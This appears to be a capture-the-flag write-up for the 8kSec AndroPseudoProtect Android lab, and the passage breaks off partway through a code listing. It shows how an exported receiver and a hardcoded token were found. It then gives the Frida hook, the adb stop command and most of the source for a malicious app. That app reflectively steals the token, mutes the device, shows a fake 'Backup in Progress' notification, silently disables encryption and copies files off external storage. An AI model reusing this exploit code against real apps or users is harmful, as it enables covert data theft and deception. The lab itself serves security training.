---
title: AndroPseudoProtect - 8kSec
date: 2025-10-1 00:00:00 +/-TTTT
categories: [8kSec]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase
---

<br />

**Description**

Tired of worrying about your device security? **AndroPseudoProtect** offers comprehensive protection with just a tap! Our advanced security service monitors your device 24/7, providing real-time alerts through persistent notifications. With military-grade encryption and native code implementation for optimal performance, AndroPseudoProtect delivers peace of mind without draining your battery. 


AndroPseudoProtect encrypts all files on your device's external storage to protect against unauthorized access. No more worrying about sensitive files you store on external storage. The intuitive interface lets you activate protection with one tap and includes secure authentication when disabling, ensuring only you control your device's security status.

<br />

**Objective**

Create a malicious application that exploits the AndroPseudoProtect application by targeting vulnerabilities in its IPC mechanisms. Your goal is to develop an Android application that can silently disable the encryption protection without the user's knowledge or consent. The attacker should also be able to steal unencrypted files otherwise considered encrypted on the external filesystem. The exploit should ensure that even when users believe they've activated the advanced protection, it remains ineffective because the victim application turns it off in the background, undermining the app's publicized security claims. All this without needing any action from the victim!

Successfully completing this challenge demonstrates a critical vulnerability in service authentication that could allow attackers to silently disable security protections, putting sensitive user data at risk and potentially enabling further device compromise.

<br />

**Restrictions**

Your exploit must work on Android versions up to Android 15 and must not require any runtime permissions to be granted by the victim except the standard external storage access permissions and notification permissions on the device. Your attacker PoC should demonstrate the ability to extract and reuse any application-generated or hardcoded tokens from the victim application through normal user interaction, rather than hardcoding those tokens directly into the PoC. 

<br />

**Explore the application**

Upon launching the app, you’ll notice that the security status is marked as **“INSECURE”** and two buttons are displayed: **“Start Security”** and **“Stop Security.”**

<br />

![](/assets/img/8ksec/AndroPseudoProtect/1.png)

<br />

I created a file named **test.txt** in the **/sdcard/** directory containing the text **“123”** to observe how the application encrypts files.

![](/assets/img/8ksec/AndroPseudoProtect/2.png)

<br />

After pressing the **“Start Security”** button, the security status changes to **“SECURE,”** and a notification appears stating that all files have been encrypted successfully.

![](/assets/img/8ksec/AndroPseudoProtect/3.png)

<br />

The **test.txt** file has been renamed to **test.txt.encrypted**, and its contents are now encrypted.

![](/assets/img/8ksec/AndroPseudoProtect/4.png)

<br />

After pressing the **“Stop Security”** button, the security status reverts to **“INSECURE,”** and a notification appears indicating that all files have been decrypted successfully.

![](/assets/img/8ksec/AndroPseudoProtect/5.png)

<br />

The **test.txt.encrypted** file is renamed back to **test.txt**, and its contents are successfully decrypted.

![](/assets/img/8ksec/AndroPseudoProtect/6.png)

<br />

**Analyzing the application using JADX**

From: AndroidManifest.xml 

```XML
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission
    android:name="android.permission.WRITE_EXTERNAL_STORAGE"
    android:maxSdkVersion="29"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

<br />

| Permission                | Purpose                                               |
| ------------------------- | ----------------------------------------------------- |
| `FOREGROUND_SERVICE`      | Run long background tasks with a visible notification |
| `POST_NOTIFICATIONS`      | Show notifications                                    |
| `READ_EXTERNAL_STORAGE`   | Read files from `/sdcard/`                            |
| `WRITE_EXTERNAL_STORAGE`  | Modify files on `/sdcard/`                            |
| `MANAGE_EXTERNAL_STORAGE` | Full “All Files Access”                               |

<br />

```xml
<service
    android:name="com.eightksec.andropseudoprotect.SecurityService"
    android:exported="true"
    android:foregroundServiceType="dataSync"/>
```

**android:name="com.eightksec.andropseudoprotect.SecurityService"**
 → Points to the fully qualified class name of your service (`SecurityService`). The system will instantiate this class when the service is started.

**android:exported="true"**
 → This means **other apps** (outside your app) can send intents to this service.

**Security note:** If your service doesn’t have proper permission checks, this can be a **security risk** because any app can bind or start it. In Android 12+ (`API 31+`), `android:exported` is required explicitly.

**android:foregroundServiceType="dataSync"**
 → Indicates this is a **foreground service** that does work related to **data synchronization** (downloading, uploading, syncing).
 Since Android 10 (`API 29`), you must declare the type of foreground service (`location`, `mediaPlayback`, `dataSync`, etc.), or else the app might be rejected from Play Store or killed by the system.



<br />

```xml
<receiver
    android:name="com.eightksec.andropseudoprotect.SecurityReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.eightksec.andropseudoprotect.START_SECURITY"/>
        <action android:name="com.eightksec.andropseudoprotect.STOP_SECURITY"/>
    </intent-filter>
</receiver>
```

- **android:name="com.eightksec.andropseudoprotect.SecurityReceiver"**
   → Points to a `BroadcastReceiver` class in your app (e.g., `SecurityReceiver.java`). This class will handle broadcast `Intent`s.
- **android:exported="true"**
   → This means **other apps** can send broadcasts to this receiver, not just your own app.
- **`<intent-filter>`**
   → Declares which broadcast `Intent` actions the receiver listens for:
  - `"com.eightksec.andropseudoprotect.START_SECURITY"`
  - `"com.eightksec.andropseudoprotect.STOP_SECURITY"`

So, any app can now send:

```java
Intent intent = new Intent("com.eightksec.andropseudoprotect.START_SECURITY");
sendBroadcast(intent);
```

And your `SecurityReceiver` will get it.

<br />

**Note:** Because of `android:exported="true"` **without restrictions**, any third-party app on the device can trigger these actions.
 If your `SecurityReceiver` starts/stops services, changes security features, or does anything sensitive, this could be abused.

<br />

From: com.eightksec.andropseudoprotect.SecurityReceiver

```java
public final class SecurityReceiver extends BroadcastReceiver {
    private static final String TAG = "SecurityReceiver";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String str;
        Intrinsics.checkNotNullParameter(context, "context");
        Intrinsics.checkNotNullParameter(intent, "intent");
        try {
            Intent intent2 = new Intent(context, (Class<?>) SecurityService.class);
            intent2.setAction(intent.getAction());
            Bundle extras = intent.getExtras();
            if (extras != null) {
                intent2.putExtras(extras);
            }
            if (intent.hasExtra(SecurityService.EXTRA_SECURITY_TOKEN)) {
                intent.getStringExtra(SecurityService.EXTRA_SECURITY_TOKEN);
            }
            String action = intent.getAction();
            try {
                if (action != null) {
                    int hashCode = action.hashCode();
                    if (hashCode != -1447419790) {
                        if (hashCode == -1187150936 && action.equals(SecurityService.ACTION_START_SECURITY)) {
                            str = "Starting security service";
                            Toast.makeText(context, "Receiver: ".concat(str), 0).show();
                            context.startService(intent2);
                            return;
                        }
                    } else if (action.equals(SecurityService.ACTION_STOP_SECURITY)) {
                        str = "Stopping security service";
                        Toast.makeText(context, "Receiver: ".concat(str), 0).show();
                        context.startService(intent2);
                        return;
                    }
                }
                context.startService(intent2);
                return;
            } catch (Exception e) {
                Toast.makeText(context, "Error: " + e.getMessage(), 1).show();
                return;
            }
            str = "Unknown action received";
            Toast.makeText(context, "Receiver: ".concat(str), 0).show();
        } catch (Exception e2) {
            Toast.makeText(context, "Receiver error: " + e2.getMessage(), 1).show();
        }
    }
}
```

Within the **onReceive()** function, the code verifies the intent action and the security token. If the intent action is **"com.eightksec.andropseudoprotect.START_SECURITY"**, it initiates the service responsible for encrypting files. Conversely, if the intent action is **"com.eightksec.andropseudoprotect.STOP_SECURITY"**, it starts the service that decrypts the files.



<br />

From: com.eightksec.andropseudoprotect.SecurityService

```java
public final class SecurityService extends Service implements FileProcessor.ProgressCallback {
    public static final String ACTION_DECRYPTION_COMPLETE = "com.eightksec.andropseudoprotect.DECRYPTION_COMPLETE";
    public static final String ACTION_ENCRYPTION_COMPLETE = "com.eightksec.andropseudoprotect.ENCRYPTION_COMPLETE";
    public static final String ACTION_ENCRYPTION_PROGRESS = "com.eightksec.andropseudoprotect.ENCRYPTION_PROGRESS";
    public static final String ACTION_SECURITY_STARTED = "com.eightksec.andropseudoprotect.SECURITY_STARTED";
    public static final String ACTION_SECURITY_STOPPED = "com.eightksec.andropseudoprotect.SECURITY_STOPPED";
    public static final String ACTION_START_SECURITY = "com.eightksec.andropseudoprotect.START_SECURITY";
    public static final String ACTION_STOP_SECURITY = "com.eightksec.andropseudoprotect.STOP_SECURITY";
    private static final String CHANNEL_ID = "security_service_channel";
    public static final String EXTRA_CURRENT_DIRECTORY = "current_directory";
    public static final String EXTRA_ENCRYPTED_FILES_LIST = "encrypted_files_list";
    public static final String EXTRA_PROCESSED_FILES = "processed_files";
    public static final String EXTRA_SECURITY_TOKEN = "security_token";
    public static final String EXTRA_TOTAL_FILES = "total_files";
    private static final int NOTIFICATION_ID = 1;
    private static final String TAG = "SecurityService";
    private EncryptionUtils encryptionUtils;
    private FileProcessor fileProcessor;
    private boolean isServiceRunning;
    private NotificationManager notificationManager;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        Object systemService = getSystemService("notification");
        Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.app.NotificationManager");
        this.notificationManager = (NotificationManager) systemService;
        createNotificationChannel();
        this.encryptionUtils = new EncryptionUtils();
        EncryptionUtils encryptionUtils = this.encryptionUtils;
        if (encryptionUtils == null) {
            Intrinsics.throwUninitializedPropertyAccessException("encryptionUtils");
            encryptionUtils = null;
        }
        this.fileProcessor = new FileProcessor(encryptionUtils, this);
        startAsForeground();
    }


    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        if (action != null) {
            int hashCode = action.hashCode();
            if (hashCode != -1447419790) {
                if (hashCode == -1187150936 && action.equals(ACTION_START_SECURITY)) {
                    String stringExtra = intent.getStringExtra(EXTRA_SECURITY_TOKEN);
                    if (stringExtra != null && Intrinsics.areEqual(stringExtra, new SecurityUtils().getSecurityToken())) {
                        if (this.isServiceRunning) {
                            stopSecurity();
                        }
                        startSecurity();
                    }
                    return 1;
                }
            } else if (action.equals(ACTION_STOP_SECURITY)) {
                String stringExtra2 = intent.getStringExtra(EXTRA_SECURITY_TOKEN);
                if (stringExtra2 != null && Intrinsics.areEqual(stringExtra2, new SecurityUtils().getSecurityToken())) {
                    stopSecurity();
                }
                return 1;
            }
        }
        startAsForeground();
        return 1;
    }

    private final void startSecurity() {
        if (this.isServiceRunning) {
            return;
        }
        this.isServiceRunning = true;
        SecurityService securityService = this;
        Notification build = new NotificationCompat.Builder(securityService, CHANNEL_ID).setContentTitle(getString(R.string.app_name)).setContentText(getString(R.string.notification_secure)).setSmallIcon(android.R.drawable.ic_lock_lock).setContentIntent(PendingIntent.getActivity(securityService, 0, new Intent(securityService, (Class<?>) MainActivity.class), 67108864)).setOngoing(true).setPriority(1).setVisibility(1).setCategory(NotificationCompat.CATEGORY_SERVICE).build();
        Intrinsics.checkNotNullExpressionValue(build, "Builder(this, CHANNEL_ID…ICE)\n            .build()");
        try {
            startForeground(1, build);
            ToastUtils.showSuccessToast$default(ToastUtils.INSTANCE, this, "Security started", 0, 4, null);
            sendBroadcast(new Intent(ACTION_SECURITY_STARTED));
            FileProcessor fileProcessor = this.fileProcessor;
            if (fileProcessor == null) {
                Intrinsics.throwUninitializedPropertyAccessException("fileProcessor");
                fileProcessor = null;
            }
            fileProcessor.startEncryption();
        } catch (Exception e) {
            ToastUtils.showErrorToast$default(ToastUtils.INSTANCE, securityService, "Error starting service: " + e.getMessage(), 0, 4, null);
        }
    }

    }
}
```

Inside the **SecurityService.onStartCommand()** function, the code checks whether the intent extra **"security_token"** matches the value returned by **SecurityUtils().getSecurityToken()**. Based on the intent action, it then either starts or stops the security service.

<br />

From: com.eightksec.andropseudoprotect.SecurityUtils

```java
public final class SecurityUtils {
    public final native String getSecurityToken();

    static {
        System.loadLibrary("security-native");
    }
}
```

<br />

Hooking the `getSecurityToken()` native function with Frida to capture the token.

```javascript
Java.perform(function () {
    let SecurityUtils = Java.use("com.eightksec.andropseudoprotect.SecurityUtils");
    SecurityUtils["getSecurityToken"].implementation = function () {
        console.log(`SecurityUtils.getSecurityToken is called`);
        let result = this["getSecurityToken"]();
        console.log(`SecurityUtils.getSecurityToken result=${result}`);
        return result;
    };
});
```

<br />

```
frida -U -f com.eightksec.andropseudoprotect -l hook.js
```

<br />

```
[Android Emulator 5554::com.eightksec.andropseudoprotect ]-> SecurityUtils.getSecurityToken is called
SecurityUtils.getSecurityToken result=8ksec_S3cr3tT0k3n_D0N0tSh4r3
```

**Token:** 8ksec_S3cr3tT0k3n_D0N0tSh4r3



<br />

Because the broadcast receiver `com.eightksec.andropseudoprotect.SecurityReceiver` is exported, external apps can invoke it to start or stop the service. You can confirm this with **adb**: after launching the app’s encryption service, send the corresponding intent via an **adb** command and you’ll see the service stop

```
adb shell am broadcast -n com.eightksec.andropseudoprotect/.SecurityReceiver -a com.eightksec.andropseudoprotect.STOP_SECURITY --es "security_token" "8ksec_S3cr3tT0k3n_D0N0tSh4r3"
```

<br />

Since hardcoding the token in our exploit is disallowed, we use Java reflection to invoke `getSecurityToken()` in the target app at runtime. Reflection lets you inspect and call classes, methods and fields at runtime even if you don't have compile-time access to them.

<br />

---

**Dynamic class loading**

Dynamic class loading in Android is a technique that allows an application to load and use classes that were not originally compiled into its APK. Instead of having all the code available at compile time, the app can, at runtime, load classes from external sources—such as another installed app, a plugin, or a DEX/JAR file—using a `ClassLoader` and reflection. In the provided code, the app creates a context for another package (`com.eightksec.andropseudoprotect`) using `createPackageContext()`, which grants access to that app’s code and resources. Then, it retrieves the other app’s `ClassLoader` to dynamically load the `SecurityUtils` class from that package. Through Java reflection, it creates an instance of that class and invokes its `getSecurityToken()` method, returning the result to the caller. This process enables one app to execute methods from another app without any compile-time dependency, which can be useful for modular design, security, or code obfuscation. However, it also carries risks—such as compatibility issues, security vulnerabilities, and potential violations of Google Play policies, since it effectively bypasses the normal boundaries between apps.

<br />

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
    tools:ignore="QueryAllPackagesPermission"/>
```

This permission allows your app to see **all apps installed on the device**, not just those you can normally interact with.

<br />

From: SecurityUtils.java

```java
package com.example.andropseudoprotect;

import android.content.Context;
import java.lang.reflect.Method;


public class SecurityUtils {

    private final Context context;

    // Inject the app context from your main app
    public SecurityUtils(Context context) {
        this.context = context;
    }

    public String getSecurityToken() {


        try {
            // Create a context for the target app
            Context otherAppContext = context.createPackageContext(
                    "com.eightksec.andropseudoprotect",
                    Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY
            );

            // Load a class from the other app using that context's ClassLoader
            ClassLoader classLoader = otherAppContext.getClassLoader();
            Class<?> clazz = classLoader.loadClass("com.eightksec.andropseudoprotect.SecurityUtils");

            // Create an instance and call the method
            Object instance = clazz.getDeclaredConstructor().newInstance();
            Method method = clazz.getMethod("getSecurityToken");

            // Invoke and capture the result
            Object result = method.invoke(instance);
            if (result != null) {
                return result.toString();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        // Return null or a default value if anything fails
        return null;
    }
}
```

This code:

**Creates a new `Context` for another app (target package):**

- `createPackageContext()` lets your app access code and resources from another installed app.
- `CONTEXT_INCLUDE_CODE` — allows loading that app’s code.
- `CONTEXT_IGNORE_SECURITY` — bypasses some sandbox restrictions.

**Uses the other app’s `ClassLoader` to load a class dynamically:**

- This class (`com.eightksec.andropseudoprotect.SecurityUtils`) is **not in your own APK**.
- It’s loaded from the **other app’s DEX**.

**Uses Java Reflection to:**

- Instantiate that class.
- Get its public method `getSecurityToken()`.
- Invoke it dynamically.
- Return the result as a string.

So, effectively, your app is **calling a method defined in another app’s code**, without having any compile-time dependency on it.

<br />

From: MainActivity.java

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        SecurityUtils securityutils = new SecurityUtils(this);
        String token = securityutils.getSecurityToken();
        Log.i("andropseudoprotect", "Token: " + token);
    }

}
```

<br />

----

<br />

**Request external storage permissions for android 13+**

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
<uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
<uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
```



<br />

```java
public class MainActivity extends AppCompatActivity {

    private static final int STORAGE_PERMISSION_REQUEST = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkAndRequestStoragePermission();
    }

    private void checkAndRequestStoragePermission() {
        // For Android 13+ use the new scoped media permissions
        String[] permissions = {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
        };

        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, STORAGE_PERMISSION_REQUEST);
        } else {
            Toast.makeText(this, "Storage permission already granted", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_REQUEST) {
            boolean granted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }

            if (granted) {
                Toast.makeText(this, "Storage permission granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Storage permission denied", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
```

<br />

----

<br />

**Send Notifications**

Add Permission (Android 13+):

Starting with **Android 13 (API 33)**, you must explicitly **request notification permission** at runtime.

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
```

<br />

Request it in your activity (for Android 13+):

```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
    if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
    }
}
```

<br />

Create a Notification Channel (Android 8.0+):

Notification channels are required from **Android 8.0 (API 26)** onward. You only need to create a channel **once** (typically when your app starts).

<br />

```java
package com.example.andropseudoprotect;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
public class NotificationHelper {

    public static final String CHANNEL_ID = "channel_id";

    public static void createNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String name = "General Notifications";
            String description = "Includes all general notifications";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;

            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            NotificationManager notificationManager =
                    context.getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
}
```

<br />

Build and Send a Notification:

```java
package com.example.andropseudoprotect;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

public class NotificationUtils {

    public static void showNotification(Context context, String title, String message) {
        // Create an intent that opens your app when tapped
        Intent intent = new Intent(context, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        PendingIntent pendingIntent = PendingIntent.getActivity(
                context, 0, intent,
                PendingIntent.FLAG_IMMUTABLE // required for Android 12+
        );

        // Build the notification
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, NotificationHelper.CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_notification) // your app’s icon
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent);

        // Show the notification
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
                == PackageManager.PERMISSION_GRANTED) {
            notificationManager.notify(1001, builder.build());
        }
    }
}
```

<br />

 How to Create an Icon in Android Studio

**Option 1: Vector Asset**

1. Right-click on `res/drawable` → **New → Vector Asset**
2. Choose a built-in Material icon (e.g., “notifications”)
3. Name it `ic_notification`
4. Click **Next → Finish**

<br />

Use It in Your Activity:

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // Step 1: Create the notification channel
    NotificationHelper.createNotificationChannel(this);

    // Step 2: Request notification permission if needed
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
        }
    }

    // Step 3: Send a notification
    NotificationUtils.showNotification(this, "Hello!", "This is your first Android notification!");
}
```

<br />

-----

<br />

**Mute the Device**

Add the Required Permission in `AndroidManifest.xml`

```xml
<uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
```

<br />

Ask the User to Grant Access in Settings: Before calling any DND API, check if your app has permission:

```java
NotificationManager notificationManager =
        (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
    if (!notificationManager.isNotificationPolicyAccessGranted()) {
        // Open system settings so the user can grant access
        Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
        startActivity(intent);
        Toast.makeText(this, "Please allow notification policy access for this app", Toast.LENGTH_LONG).show();
        return;
    }
}
```



Now You Can Mute / Unmute Safely: Once access is granted, you can safely control DND:

```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
    NotificationManager notificationManager =
            (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

    // Mute device
    notificationManager.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE);

    // Unmute later
    // notificationManager.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL);
}

```

<br />

---

<br />

**The Full Exploit**

AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
    tools:ignore="QueryAllPackagesPermission"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
<uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
<uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
```

<br />

MainActivity.java

```java
package com.example.andropseudoprotect;

import static android.os.SystemClock.sleep;

import android.Manifest;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int STORAGE_PERMISSION_REQUEST = 100;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        TextView tokenTextView = findViewById(R.id.textView);
        Button btnStop = findViewById(R.id.StopBtn);
        Context context = MainActivity.this;

        SecurityUtils securityutils = new SecurityUtils(this);
        String token = securityutils.getSecurityToken();
        String txtviewstring = "The Security Token: " + token;
        tokenTextView.setText(txtviewstring);
        checkAndRequestStoragePermission();
        RequestSendingNotifications();
        RequestPermissionsToMute();
        NotificationHelper.createNotificationChannel(this);

        btnStop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                muteTheDevice();
                // Send the notification
                NotificationUtils.showNotification(
                        MainActivity.this,
                        "Backup in Progress",
                        "Your files are being backed up securely. Please wait..."
                );
                sendBroadcastToSecurityApp("com.eightksec.andropseudoprotect.STOP_SECURITY", token);
                sleep(500);
                stealFiles(context);
            }
        });
    }

    private void sendBroadcastToSecurityApp(String action, String token) {
        Intent intent = new Intent(action);
        // Target the receiver app explicitly (important on Android 8+)
        intent.setPackage("com.eightksec.andropseudoprotect");
        intent.putExtra("security_token", token);
        sendBroadcast(intent);
    }


    private void checkAndRequestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            }
        }

        // For Android 13+ use the new scoped media permissions
        String[] permissions = {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
        };

        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, STORAGE_PERMISSION_REQUEST);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_REQUEST) {
            boolean granted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }

            if (granted) {
                Toast.makeText(this, "Storage permission granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Storage permission denied", Toast.LENGTH_SHORT).show();
            }
        }
    }


    private void RequestSendingNotifications() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
            }
        }

    }


    private void RequestPermissionsToMute() {

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!notificationManager.isNotificationPolicyAccessGranted()) {
                // Open system settings so the user can grant access
                Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
                startActivity(intent);
                Toast.makeText(this, "Please allow notification policy access for this app", Toast.LENGTH_LONG).show();
                return;
            }
        }

    }

    private void muteTheDevice() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            NotificationManager notificationManager =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

            // Mute device
            notificationManager.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE);
        }
    }

    public void stealFiles(Context context){
        StealFiles stealfiles = new StealFiles();
        stealfiles.copyFilesFromSdcard(context);
    }

}
```

<br />

NotificationUtils.java

```java
package com.example.andropseudoprotect;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

public class NotificationUtils {

    public static void showNotification(Context context, String title, String message) {
        // Create an intent that opens your app when tapped
        Intent intent = new Intent(context, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        PendingIntent pendingIntent = PendingIntent.getActivity(
                context, 0, intent,
                PendingIntent.FLAG_IMMUTABLE // required for Android 12+
        );

        // Build the notification
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, NotificationHelper.CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_notification) // your app’s icon
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent);

        // Show the notification
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
                == PackageManager.PERMISSION_GRANTED) {
            notificationManager.notify(1001, builder.build());
        }
    }
}
```

<br />

NotificationHelper.java

```java
package com.example.andropseudoprotect;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
public class NotificationHelper {

    public static final String CHANNEL_ID = "channel_id";

    public static void createNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String name = "General Notifications";
            String description = "Includes all general notifications";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;

            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            NotificationManager notificationManager =
                    context.getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
}
```

<br />

SecurityUtils.java

```java
package com.example.andropseudoprotect;

import android.content.Context;
import java.lang.reflect.Method;


public class SecurityUtils {

    private final Context context;

    public SecurityUtils(Context context) {
        this.context = context;
    }

    public String getSecurityToken() {

        try {
            // Create a context for the target app
            Context otherAppContext = context.createPackageContext(
                    "com.eightksec.andropseudoprotect",
                    Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY
            );

            // Load a class from the other app using that context's ClassLoader
            ClassLoader classLoader = otherAppContext.getClassLoader();
